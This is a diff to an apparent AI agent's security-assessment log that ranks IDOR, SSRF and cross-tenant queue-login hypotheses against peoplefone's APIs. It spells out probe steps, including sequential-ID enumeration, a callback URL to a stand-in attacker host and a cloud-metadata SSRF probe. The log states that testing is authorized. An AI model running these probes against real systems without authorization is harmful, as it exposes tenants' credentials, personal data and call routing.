@@ -2174,3 +2174,66 @@ Output written to analyst-out.txt.
 - ACCEPTED SSRF @ 5 endpoints: zero-validated callback URLs; External Number Lookup exfiltrates custom headers — CRITICAL, token-gated.
 
 **STEP 7 — RISK**: [RISK] peoplefone GmbH: 88/100 — 8 OpenAPI specs confirm 3 CRITICAL hypothesis classes, all gated behind one portal token; uniform 401 confirmed no legacy bypass; single weak registration/login compromises the full multi-tenant PBX surface.
+===== ANALYST bigpickle 2026-09-04 22:17:33 UTC =====
+[0m
+> build · big-pickle
+[0m
+STEP 1 — DELTA:
+NO_DELTA: no new inventory surface added since 2026-09-04 19:53 UTC tick (last two runs produced empty entries; probe-results unchanged).
+[CHANGED] Two independent model runs (bigpickle, nemotron3) converged on the identical top hypothesis — configuration-api {identifier} CRUD IDOR — cross-model corroboration strengthens its priority ranking.
+
+STEP 2 — PRIORITIZE:
+[PRIO] configuration-api.peoplefone.com,8.6,attack_surface:10,business_value:10,tech_exposure:9,gate_ease:4,cloud_surface:7,freshness:9 — gate_ease lowered from 7: KB confirms bearer token is the sole blocker and issuance path is off-spec (404 on standard OAuth endpoints)
+[PRIO] call-api.peoplefone.com,8.2,attack_surface:9,business_value:9,tech_exposure:9,gate_ease:4,cloud_surface:8,freshness:9 — same token gate; SSRF + queue BUSLOGIC surface
+[PRIO] api.peoplefone.com,7.0,attack_surface:8,business_value:7,tech_exposure:7,gate_ease:5,cloud_surface:6,freshness:8 — dev-portal/Swagger host; ben/gin surface lower now that specs are fully harvested
+
+STEP 3 — HYPOTHESES:
+[HYP] IDOR/BOLA on Configuration API {identifier} CRUD across 8 resource types
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
+confidence: 85
+reasoning: 235KB spec; numeric sequential identifiers; spec states "user must be part of account bound to bearer token" (boundary claim); UserResponse exposes sipUserName, physical address, email; full CRUD incl. DELETE; object-level enforcement unproven; live 401 gate confirmed at /customer/voip/v1; two independent agent runs both rank this top
+evidence_needed: tenant-A token returns tenant-B {identifier} object, or adjacent sequential-id enumeration leaks foreign tenant objects
+verify_steps: (authorized token, read-only) GET /customer/voip/v1/users to map own id space; then GET /users/{own_id}, /users/{own_id+1}, /users/{own_id-1}; repeat for /numbers/{did} and /callforwarding/{id}; compare returned tenant/owner markers vs token-bound tenant
+impact: cross-tenant PBX takeover — SIP creds, PII (physical address, email), DID routing, call-forwarding/IVR/queue reprogramming; severity CRITICAL
+testability: AUTH_HELPED
+
+[HYP] SSRF via 5 callback-accepting endpoints incl. custom-header exfiltration
+class: SSRF
+asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api smart-routings/{id}/webhook + call-api uaCSTA device/monitorStart + configuration-api external-number-lookup (webhookUrl)
+confidence: 78
+reasoning: 5 endpoints accept format:uri with zero host/scheme allowlist; External Number Lookup forwards customer-configured Authorization/X-API-Key to attacker URL; uaCSTA monitorStart streams SIP username+number call events; Smart Routing X-Track-Id single-use (2-min); deprecated External Routing (2026-09-30, still live) repeats pattern on possibly weaker code path
+evidence_needed: post-auth callback POST reaches attacker host; 169.254.169.254/loopback/internal ranges not filtered
+verify_steps: (authorized token) SMS POST with callbackUrl=https://attacker-collab.example/x and probe variant http://169.254.169.254/latest/meta-data/; register Smart Routing webhook url; uaCSTA POST /device/monitorStart with monitoringCallbackUrl — inspect attacker-side receipt only
+impact: cloud metadata/IAM theft, internal SIP/PBX pivot, credential exfiltration via forwarded headers, live call-metadata leak; severity CRITICAL
+testability: AUTH_HELPED
+
+[HYP] Business logic — cross-tenant agent login/logout on Queue API
+class: BUSLOGIC
+asset: call-api.peoplefone.com/customer/queue/v1/agents/login + /agents/logout
+confidence: 65
+reasoning: POST accepts agent identifier (type user) + queueScope selected/all + optional queues array; queue identifiers numeric sequential (2000, 2001...); permanentMembership flag implies persistent queue state; spec silent on membership-vs-boundary validation for the acted-on agent
+evidence_needed: tenant-A token logs in or logs out tenant-B agent on tenant-B queue, with 200 instead of 403
+verify_steps: (authorized token) POST /customer/queue/v1/agents/login {agent:{identifier: "<foreign_user_id>"}, queueScope:"all"}; 200 = flaw, 403 = boundary enforced; no other mutation
+impact: forced agent offline / call-center disruption, rerouting of live traffic; severity HIGH
+testability: AUTH_HELPED
+
+STEP 4 — SELF-CRITIQUE:
+No hypothesis below confidence 40; none in REJECTED classes; all three have concrete verify steps.
+[PARKED] AUTH @ auth.peoplefone.com OAuth redirect_uri/state flaw (client_id=1 arbitrary redirect): no live authorize endpoint (404 at standard paths) and token issuance absent from all 8 specs — parked until portal.peoplefone.ch session flow is mapped by an authorized operator
+[FINAL] IDOR on Configuration API {identifier} CRUD — 85, AUTH_HELPED, CRITICAL — RETAIN
+[FINAL] SSRF via 5 callback endpoints (incl. header exfiltration) — 78, AUTH_HELPED, CRITICAL — RETAIN
+[FINAL] BUSLOGIC Queue API agent login/logout — 65, AUTH_HELPED, HIGH — RETAIN (weakest evidence; park if token yields 403 on first probe)
+
+STEP 5 — NEXT ACTION:
+[NEXT] HUMAN: Within authorized scope, create a test account on portal.peoplefone.ch to obtain a bearer token, then run the two read-only IDOR confirmations (GET /customer/voip/v1/users/{own_id±1}) in an authorized context; agent-side probing now yields no delta and every remaining step is token-gated.
+
+STEP 6 — LEARNING:
+[LEARN] ACCEPTED IDOR @ configuration-api: cross-model convergence (bigpickle+nemotron3) both rank {identifier} CRUD as top candidate; no counter-evidence surfaced — retains top slot
+[LEARN] ACCEPTED SSRF @ 5 endpoints: no new counter-evidence since spec harvest; retained pending token
+[LEARN] ACCEPTED BUSLOGIC @ call-api queue agents: retained at lowest rank — weakest evidence class, spec-silent on membership validation
+[LEARN] REJECTED AUTH @ auth.peoplefone.com: re-confirmed token issuance outside all 8 specs and standard endpoints 404 — agent-side token acquisition impossible; human+portal required
+[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: no new dangling-target candidates; wildcard remains Cloudflare CNAME-dominated
+
+STEP 7 — RISK:
+[RISK] peoplefone GmbH: 89/100 — all three CRITICAL/HIGH hypothesis classes remain live but unverified behind a single auth gate; extensive 8-spec API surface exposing SIP creds, PII, DID routing, call-forwarding/IVR/queue state; 5 SSRF endpoints with a header-exfiltration variant; deprecated 2026-09-30 API still exposed; overall impact is entirely gated on token acquisition that no agent path can obtain, so confirmation is deferred to the authorized operator step.
